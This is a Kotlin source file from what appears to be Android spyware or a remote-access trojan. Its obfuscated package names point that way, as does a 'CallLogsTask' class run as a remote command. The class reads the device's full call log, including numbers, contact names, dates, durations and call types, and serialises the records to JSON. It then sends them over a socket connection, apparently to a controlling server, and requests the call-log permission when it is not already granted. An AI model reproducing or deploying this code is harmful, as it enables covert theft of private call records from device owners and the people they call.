package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.core.content.ContextCompat
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.commandp.utilsss.CallLog
import com.xxx.zzz.socketsp.IOSocketyt
import java.text.SimpleDateFormat
import java.util.*


class CallLogsTask(private val ctx: Context, private val cnt: Int?) : BaseTask(ctx) {

    private fun getCallLog(): ArrayList<CallLog> {
        val callLogList = ArrayList<CallLog>()
        runCatching {
            val strOrder = android.provider.CallLog.Calls.DATE + " DESC"
            val callUri = Uri.parse("content://call_log/calls")
            val cur = ctx.contentResolver.query(callUri, null, null, null, strOrder)!!

            while (cur.moveToNext()) {
                val number =
                    cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
                val name =
                    cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME))
                val millisDate =
                    cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE))
                val millisDuration =
                    cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION))
                val callType =
                    cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE))
                val isCallNew =
                    cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NEW))

                val formatter = SimpleDateFormat("dd-MMM-yyyy hh:mm aa", Locale.ENGLISH)
                val date = formatter.format(Date(millisDate.toLong()))

                val formatter2 = SimpleDateFormat("HH:mm:ss", Locale("en"))
                formatter2.timeZone = TimeZone.getTimeZone("UTC")
                val duration = formatter2.format(Date(millisDuration.toLong() * 1000))

                callLogList.add(
                    CallLog(
                        number, name
                            ?: "<unknown>", date, duration, callType, isCallNew
                            ?: "<unknown>"
                    )
                )

                if (cnt != null && callLogList.size >= cnt)
                    break
            }
            cur.close()

            IOSocketyt.sendLogs("", "CallLogsTask $cnt", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "CallLogsTask ${it.localizedMessage}", "error")
        }
        return callLogList
    }

    private fun getJSON(list: ArrayList<CallLog>): String {
        return Gsonq().toJson(list)
    }

    private fun uploadCallLog(): String {
        return getJSON(getCallLog())
    }

    override fun run() {
        super.run()
        runCatching {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED)
                foo(uploadCallLog())
            else
                requestPermissions()
        }
    }

    private fun foo(str: String) {
        IOSocketyt.sendLogs("", str, "callLog")
    }

}
